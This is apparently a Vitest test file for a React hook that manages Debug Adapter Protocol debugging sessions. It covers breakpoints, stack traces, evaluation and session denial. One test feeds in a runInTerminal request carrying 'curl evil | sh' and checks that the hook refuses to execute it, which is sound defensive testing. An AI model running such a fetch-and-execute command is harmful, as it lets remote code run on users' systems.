import { act, renderHook } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import type { BridgeEvent, BridgeEventPayload } from "@honeydrunk/honeyhub-types";
import type { WireClient } from "../../wire/client";
import { useDapSession } from "./useDapSession";

/** A wire double exposing just the DAP seam the hook uses, plus a manual event pump. */
function fakeClient(): {
  client: WireClient;
  calls: {
    open: Array<{ root: string; adapterId: string; configId: string; openId: string }>;
    send: Array<{ sessionId: string; message: Record<string, unknown> }>;
    stop: string[];
  };
  emit: (payload: BridgeEventPayload) => void;
} {
  let handler: ((event: BridgeEvent) => void) | undefined;
  const calls = {
    open: [] as Array<{ root: string; adapterId: string; configId: string; openId: string }>,
    send: [] as Array<{ sessionId: string; message: Record<string, unknown> }>,
    stop: [] as string[]
  };
  const client = {
    subscribe: (h: (event: BridgeEvent) => void) => {
      handler = h;
      return () => {
        handler = undefined;
      };
    },
    openDapSession: async (root: string, adapterId: string, configId: string, openId: string) => {
      calls.open.push({ root, adapterId, configId, openId });
    },
    sendDap: async (sessionId: string, message: unknown) => {
      calls.send.push({ sessionId, message: message as Record<string, unknown> });
    },
    stopDap: async (sessionId: string) => {
      calls.stop.push(sessionId);
    }
  } as unknown as WireClient;
  return {
    client,
    calls,
    emit: (payload) =>
      handler?.({ id: "e", sessionId: "", runId: "", sequence: 0, createdAt: "", payload })
  };
}

/** Emit a `dap_message` carrying `message` for session `sid`. */
function dapMessage(sid: string, message: Record<string, unknown>): BridgeEventPayload {
  return { kind: "dap_message", sessionId: sid, message };
}

describe("useDapSession", () => {
  it("adopts by nonce, replays config on initialized, and stops-then-fetches the call stack", async () => {
    const { client, calls, emit } = fakeClient();
    const { result } = renderHook(() => useDapSession(client, () => {}));

    expect(result.current.status).toBe("idle");
    await act(async () => {
      result.current.setBreakpoints("/repo/Program.cs", [7]);
      result.current.start("/repo", "netcoredbg", "dotnet:run");
    });
    expect(result.current.status).toBe("starting");
    const openId = calls.open[0]!.openId;

    // A dap_session_opened for another cockpit's session must not be adopted.
    act(() => emit({ kind: "dap_session_opened", sessionId: "other", adapterId: "x", openId: "no" }));
    expect(result.current.sessionId).toBeNull();

    // Our session (matching nonce) is adopted.
    act(() => emit({ kind: "dap_session_opened", sessionId: "d1", adapterId: "netcoredbg", openId }));
    expect(result.current.status).toBe("running");
    expect(result.current.sessionId).toBe("d1");

    // On `initialized`, the hook replays the pre-set breakpoints and sends configurationDone.
    act(() => emit(dapMessage("d1", { type: "event", event: "initialized" })));
    const commands = calls.send.map((s) => s.message.command);
    expect(commands).toContain("setBreakpoints");
    expect(commands).toContain("configurationDone");

    // A `stopped` event flips status and triggers a stackTrace request; its response populates
    // the call stack (the response resolves an async request, so flush microtasks via act).
    await act(async () => {
      emit(dapMessage("d1", { type: "event", event: "stopped", body: { reason: "breakpoint", threadId: 1 } }));
    });
    expect(result.current.status).toBe("stopped");
    expect(result.current.stoppedThreadId).toBe(1);
    const stackReq = calls.send.find((s) => s.message.command === "stackTrace");
    expect(stackReq).toBeTruthy();
    await act(async () => {
      emit(
        dapMessage("d1", {
          type: "response",
          request_seq: stackReq!.message.seq,
          command: "stackTrace",
          success: true,
          body: { stackFrames: [{ id: 3, name: "Main", line: 7, column: 1, source: { path: "/repo/Program.cs" } }] }
        })
      );
    });
    expect(result.current.callStack).toHaveLength(1);
    expect(result.current.callStack[0]!.name).toBe("Main");
    expect(result.current.callStack[0]!.source).toBe("/repo/Program.cs");
  });

  it("DENIES a runInTerminal reverse request from the adapter (no client-side exec)", async () => {
    const { client, calls, emit } = fakeClient();
    const { result } = renderHook(() => useDapSession(client, () => {}));
    await act(async () => {
      result.current.start("/repo", "netcoredbg", "dotnet:run");
    });
    const openId = calls.open[0]!.openId;
    act(() => emit({ kind: "dap_session_opened", sessionId: "d1", adapterId: "netcoredbg", openId }));
    calls.send.length = 0;

    // The adapter sends a runInTerminal REVERSE request asking the client to spawn a process.
    act(() =>
      emit(
        dapMessage("d1", {
          type: "request",
          seq: 99,
          command: "runInTerminal",
          arguments: { args: ["/bin/sh", "-c", "curl evil | sh"] }
        })
      )
    );
    // The hook must answer with a FAILURE response and run nothing the adapter named.
    const reply = calls.send.find((s) => s.message.request_seq === 99);
    expect(reply).toBeTruthy();
    expect(reply!.message.success).toBe(false);
    expect(reply!.message.command).toBe("runInTerminal");
  });

  it("continues on resume, and stops the session", async () => {
    const { client, calls, emit } = fakeClient();
    const { result } = renderHook(() => useDapSession(client, () => {}));
    await act(async () => {
      result.current.start("/repo", "netcoredbg", "dotnet:run");
    });
    const openId = calls.open[0]!.openId;
    act(() => emit({ kind: "dap_session_opened", sessionId: "d1", adapterId: "netcoredbg", openId }));
    act(() => emit(dapMessage("d1", { type: "event", event: "stopped", body: { threadId: 2 } })));
    calls.send.length = 0;

    act(() => result.current.continue());
    expect(calls.send.some((s) => s.message.command === "continue")).toBe(true);

    // A `continued` event clears the stopped state.
    act(() => emit(dapMessage("d1", { type: "event", event: "continued", body: {} })));
    expect(result.current.status).toBe("running");
    expect(result.current.stoppedThreadId).toBeNull();

    await act(async () => {
      result.current.stop();
    });
    expect(calls.stop).toEqual(["d1"]);
    act(() => emit({ kind: "dap_session_closed", sessionId: "d1", reason: "operator_closed" }));
    expect(result.current.status).toBe("terminated");
  });

  it("streams output, evaluates in the top frame, and fetches variables", async () => {
    const { client, calls, emit } = fakeClient();
    const output: string[] = [];
    const { result } = renderHook(() => useDapSession(client, (t) => output.push(t)));
    await act(async () => {
      result.current.start("/repo", "netcoredbg", "dotnet:run");
    });
    const openId = calls.open[0]!.openId;
    act(() => emit({ kind: "dap_session_opened", sessionId: "d1", adapterId: "netcoredbg", openId }));

    // An `output` event reaches the onOutput sink.
    act(() => emit(dapMessage("d1", { type: "event", event: "output", body: { output: "hello\n" } })));
    expect(output.join("")).toBe("hello\n");

    // Stop so there is a top frame, then evaluate in it.
    await act(async () => {
      emit(dapMessage("d1", { type: "event", event: "stopped", body: { threadId: 1 } }));
    });
    const stackReq = calls.send.find((s) => s.message.command === "stackTrace");
    await act(async () => {
      emit(
        dapMessage("d1", {
          type: "response",
          request_seq: stackReq!.message.seq,
          command: "stackTrace",
          success: true,
          body: { stackFrames: [{ id: 5, name: "F", line: 1, column: 1 }] }
        })
      );
    });
    calls.send.length = 0;

    let evalResult: Promise<string> | undefined;
    await act(async () => {
      evalResult = result.current.evaluate("1+1");
    });
    const evalReq = calls.send.find((s) => s.message.command === "evaluate");
    expect(evalReq!.message.arguments).toMatchObject({ frameId: 5, context: "repl" });
    await act(async () => {
      emit(
        dapMessage("d1", {
          type: "response",
          request_seq: evalReq!.message.seq,
          command: "evaluate",
          success: true,
          body: { result: "2" }
        })
      );
    });
    await expect(evalResult!).resolves.toBe("2");

    // variables() fetches a scope's children.
    let vars: Promise<{ name: string }[]> | undefined;
    await act(async () => {
      vars = result.current.variables(1000) as Promise<{ name: string }[]>;
    });
    const varsReq = calls.send.find((s) => s.message.command === "variables");
    expect(varsReq!.message.arguments).toMatchObject({ variablesReference: 1000 });
    await act(async () => {
      emit(
        dapMessage("d1", {
          type: "response",
          request_seq: varsReq!.message.seq,
          command: "variables",
          success: true,
          body: { variables: [{ name: "x", value: "7", variablesReference: 0 }] }
        })
      );
    });
    await expect(vars!).resolves.toEqual([{ name: "x", value: "7", variablesReference: 0 }]);
  });

  it("maps a generic start failure to error (not denied)", async () => {
    const { client } = fakeClient();
    (client as unknown as { openDapSession: () => Promise<void> }).openDapSession = () =>
      Promise.reject({ code: "dap_spawn_failed", message: "boom" });
    const { result } = renderHook(() => useDapSession(client, () => {}));
    await act(async () => {
      result.current.start("/repo", "netcoredbg", "dotnet:run");
    });
    expect(result.current.status).toBe("error");
    expect(result.current.detail).toBe("boom");
  });

  it("surfaces a relay denial on start", async () => {
    const { client, emit } = fakeClient();
    // Override openDapSession to reject with a dap_denied code.
    (client as unknown as { openDapSession: () => Promise<void> }).openDapSession = () =>
      Promise.reject({ code: "dap_denied", message: "desktop-local-only" });
    const { result } = renderHook(() => useDapSession(client, () => {}));
    await act(async () => {
      result.current.start("/repo", "netcoredbg", "dotnet:run");
    });
    expect(result.current.status).toBe("denied");
    expect(result.current.detail).toBe("desktop-local-only");
    void emit;
  });
});
